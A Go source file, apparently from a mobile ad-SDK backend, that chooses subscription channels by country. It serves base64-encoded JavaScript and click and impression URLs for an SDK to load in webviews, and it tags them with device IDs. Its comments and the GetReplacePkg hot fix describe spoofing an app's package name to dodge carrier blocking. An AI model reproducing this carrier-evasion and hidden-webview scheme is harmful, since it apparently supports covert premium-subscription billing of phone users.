package subscription

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	dnf "github.com/brg-liuwei/godnf"

	"http_context"
	"util"
)

type Conf struct {
	ReplacePkgFile string `json:"replace_pkg_file"`
	ReportUrl      string `json:"report_url"`
	UpdateSubsUrl  string `json:"update_subs_url"`

	InfoMobiUrl         string `json:"infomobi_url"`
	InfoMobiRedirectUrl string `json:"infomobi_redirect_url"`

	KokUrl         string `json:"kok_url"`
	KokRedirectUrl string `json:"kok_redirect_url"`

	MobipotatoUrl         string `json:"mobipotato_url"`
	MobipotatoRedirectUrl string `json:"mobipotato_redirect_url"`

	WewoUrl         string `json:"wewo_url"`
	WewoRedirectUrl string `json:"wewo_redirect_url"`

	SubymUrl         string `json:"subym_url"`
	SubymRedirectUrl string `json:"subym_redirect_url"`

	WemobiUrl         string `json:"wemobi_url"`
	WemobiRedirectUrl string `json:"wemobi_redirect_url"`

	StarpUrl         string `json:"starp_url"`
	StarpRedirectUrl string `json:"starp_redirect_url"`

	MobnvUrl         string `json:"mobnv_url"`
	MobnvRedirectUrl string `json:"mobnv_redirect_url"`
}

type SubCountry struct {
	Status int    `json:"status"`
	Msg    string `json:"msg"`
	Data   struct {
		SC []DetailContry `json:"sub_country"`
	} `json:"data"`
}

type DetailContry struct {
	Switch  int      `json:"switch"`  // 1 open, 2 close
	Channel string   `json:"channel"` // kok
	Weight  float64  `json:"weight"`  // 80
	Country []string `json:"country"` // ID US
}

type SubControl struct {
	subCountry map[string]*util.Divider // country => Divider
	reportUrl  string

	infomobiUrl         string
	infoMobiRedirectUrl string

	kokUrl         string
	kokRedirectUrl string

	mobipotatoUrl         string
	mobipotatoRedirectUrl string

	wewoUrl         string
	wewoRedirectUrl string

	subymUrl         string
	subymRedirectUrl string

	wemobiUrl         string
	wemobiRedirectUrl string

	starpUrl         string
	starpRedirectUrl string

	mobnvUrl         string
	mobnvRedirectUrl string

	replacePkgs []string
}

type Subscription struct {
	UseWebView int      `json:"use_webview"` // 1:表示用webview加载clk&imp链接, 2不要求
	Report     string   `json:"report"`
	ClkUrl     string   `json:"clk_url"`
	ImpUrl     string   `json:"imp_url"`
	ReplacePkg string   `json:"package_name,omitempty"` // 用来让sdk替换webview中的包名, 防止运营商屏蔽
	Js         []string `json:"js"`                     // base64编码的js字串
}

var gSubControl *SubControl
var gMutex sync.RWMutex

func updateSubsCountryControl(url string, scs *SubCountry) error {
	if len(url) == 0 {
		return fmt.Errorf("no subscription update url")
	}
	fmt.Println("[Subscription] update country config url: ", url)
	resp, err := http.Get(url)
	if resp != nil {
		defer resp.Body.Close()
	}
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if err := json.Unmarshal(body, scs); err != nil {
		return err
	}
	return nil
}

func Init(conf *Conf) {
	update := func() error {
		subCountry := make(map[string]*util.Divider, 8)

		var scs SubCountry
		if err := updateSubsCountryControl(conf.UpdateSubsUrl, &scs); err != nil {
			return fmt.Errorf("subscription updateSubscCountryControl err: %v", err)
		}

		if scs.Status != 200 {
			return fmt.Errorf("subscription init country control msg: %s", scs.Msg)
		}

		for _, sc := range scs.Data.SC {
			if sc.Switch != 1 {
				continue
			}

			for _, c := range sc.Country {
				if t := subCountry[c]; t != nil {
					addApp(&sc, t)
				} else {
					traffic := util.NewDivider()
					subCountry[c] = traffic
					addApp(&sc, traffic)
				}
			}

		}

		for _, t := range subCountry {
			t.Compile()
		}

		gMutex.Lock()
		defer gMutex.Unlock()
		gSubControl.subCountry = subCountry

		return nil
	}

	// read pkgname
	pkgNameBytes, err := ioutil.ReadFile(conf.ReplacePkgFile)
	if err != nil {
		panic("read pkg name file err: " + err.Error())
	}
	replacePkgs := make([]string, 0, 8)
	for _, pkgname := range strings.Split(string(pkgNameBytes), "\n") {
		if len(pkgname) > 0 {
			replacePkgs = append(replacePkgs, pkgname)
		}
	}

	gSubControl = &SubControl{
		reportUrl:             conf.ReportUrl,
		infomobiUrl:           conf.InfoMobiUrl,
		infoMobiRedirectUrl:   conf.InfoMobiRedirectUrl,
		kokUrl:                conf.KokUrl,
		kokRedirectUrl:        conf.KokRedirectUrl,
		mobipotatoUrl:         conf.MobipotatoUrl,
		mobipotatoRedirectUrl: conf.MobipotatoRedirectUrl,
		wewoUrl:               conf.WewoUrl,
		wewoRedirectUrl:       conf.WewoRedirectUrl,
		subymUrl:              conf.SubymUrl,
		subymRedirectUrl:      conf.SubymRedirectUrl,
		wemobiUrl:             conf.WemobiUrl,
		wemobiRedirectUrl:     conf.WemobiRedirectUrl,
		starpUrl:              conf.StarpUrl,
		starpRedirectUrl:      conf.StarpRedirectUrl,
		mobnvUrl:              conf.MobnvUrl,
		mobnvRedirectUrl:      conf.MobnvRedirectUrl,
		replacePkgs:           replacePkgs,
	}

	if err := update(); err != nil {
		panic(err)
	}
	go func() {
		for {
			time.Sleep(3 * time.Minute)
			if err := update(); err != nil {
				fmt.Println(err)
			}
		}
	}()
}

func addApp(sub *DetailContry, t *util.Divider) {
	switch sub.Channel {
	case "kok":
		t.AddObj(sub.Weight, GetMoreKokJs, sub.Channel)
	case "mop":
		t.AddObj(sub.Weight, GetMoreMobiPotatoJs, sub.Channel)
	case "top1":
		t.AddObj(sub.Weight, GetMoreTop1Js, sub.Channel)
	case "ifm":
		t.AddObj(sub.Weight, GetMoreInfoMobiJs, sub.Channel)
	case "wewo":
		t.AddObj(sub.Weight, GetMoreWewoJs, sub.Channel)
	case "subym":
		t.AddObj(sub.Weight, GetMoreSubymJs, sub.Channel)
	case "wmb":
		t.AddObj(sub.Weight, GetMoreWemobiJs, sub.Channel)
	case "starp":
		t.AddObj(sub.Weight, GetMoreStarpJs, sub.Channel)
	case "mbn":
		t.AddObj(sub.Weight, GetMoreMobnvJs, sub.Channel)
	default:
		fmt.Println("unknown channel: ", sub.Channel)
	}
}

func getClickId(ch string, ctx *http_context.Context) (string, string) {

	base64PkgName := url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(ctx.PkgName)))
	impId := util.Rand8Bytes() + util.Rand8Bytes() + ctx.SlotId
	cid := util.GenClickId(ch)
	ts := ctx.Now.Unix()

	click_id := fmt.Sprintf("%s_%s_%s_%s_%s_%s_%s_%s_%s_%d_%s_%s_%s_%s_%s",
		cid, ch+"0001", ctx.SlotId, ctx.Country,
		"knn", ctx.SdkVersion, ctx.Ran, ctx.ServerId, impId, ts,
		ctx.Gaid, ctx.Aid, base64PkgName, ctx.Platform, ch)

	parameters := make([]string, 0, 15)
	parameters = append(parameters, "click_id="+cid)
	parameters = append(parameters, "offer_id="+ch+"0001")
	parameters = append(parameters, "slot="+ctx.SlotId)
	parameters = append(parameters, "country="+ctx.Country)
	parameters = append(parameters, "method=knn")
	parameters = append(parameters, "sv="+ctx.SdkVersion)
	parameters = append(parameters, "ran="+ctx.Ran)
	parameters = append(parameters, "server_id="+ctx.ServerId)
	parameters = append(parameters, "imp="+impId)
	parameters = append(parameters, "clk_ts="+fmt.Sprintf("%d", ts))
	parameters = append(parameters, "gaid="+ctx.Gaid)
	parameters = append(parameters, "aid="+ctx.Aid)
	parameters = append(parameters, "pkg_name="+base64PkgName)
	parameters = append(parameters, "platform="+ctx.Platform)
	parameters = append(parameters, "channel="+ch)

	return click_id, strings.Join(parameters, "&")
}

func getSubCountry(country string) *util.Divider {
	gMutex.RLock()
	defer gMutex.RUnlock()
	return gSubControl.subCountry[country]
}

func GetMoreSubJs(ctx *http_context.Context, conds []dnf.Cond) ([]*Subscription, string) {
	if gSubControl != nil {
		if traffic := getSubCountry(ctx.Country); traffic != nil {
			jsFunc, channel, err := traffic.GetObj()
			if err != nil {
				fmt.Println("GetMoreSubJs get obj err: ", err, " ch: ", channel, " jsFunc: ", jsFunc)
				return nil, ""
			}
			if channel == "top1" { // top1使用dnf在本地筛选
				f := jsFunc.(func(ctx *http_context.Context, conds []dnf.Cond) ([]*Subscription, string))
				return f(ctx, conds)
			}
			f := jsFunc.(func(ctx *http_context.Context) ([]*Subscription, string))
			return f(ctx)
		} else {
			fmt.Println("GetMoreSubJs don't support country: ", ctx.Country)
			return nil, ""
		}
	}
	fmt.Println("GetMoreSubJs  gSubControl is nil")
	return nil, ""
}

func GetReplacePkg(ctx *http_context.Context, ch string) string {
	// XXX hot fix 小影在AG会被运营商过滤
	if ctx.Country == "AG" && ch == "kok" && strings.Contains(ctx.PkgName, "xiaoying") {
		if len(gSubControl.replacePkgs) > 0 {
			return gSubControl.replacePkgs[rand.Intn(len(gSubControl.replacePkgs))]
		}
	}
	return ""
}

func HttpGet(header map[string]string, timeout time.Duration, api string, inter interface{}) error {
	c := &http.Client{
		Timeout: timeout * time.Millisecond,
	}
	request, err := http.NewRequest("GET", api, nil)
	for k, v := range header {
		request.Header.Add(k, v)
	}

	resp, err := c.Do(request)
	if resp != nil {
		defer resp.Body.Close()
	}
	if err != nil {
		return fmt.Errorf("request err: %v", err)
	}

	if encoding := resp.Header.Get("Content-Encoding"); encoding == "gzip" {
		reader, err := gzip.NewReader(resp.Body)
		if err != nil {
			return fmt.Errorf("gzip new reader err: %v", err)
		}
		defer reader.Close()

		buf := make([]byte, 0, 16)
		body := bytes.NewBuffer(buf)
		cache := make([]byte, 1024)
		if _, err := io.CopyBuffer(body, reader, cache); err != nil {
			return fmt.Errorf("gzip err: %v, ", err)
		}

		if err := json.Unmarshal(body.Bytes(), inter); err != nil {
			return fmt.Errorf("gzip unmarshal err: %v, body: %s", err, body.String())
		}
	} else {
		if err := json.NewDecoder(resp.Body).Decode(inter); err != nil {
			return fmt.Errorf("unmarshal err: %v", err)
		}
	}
	return nil
}
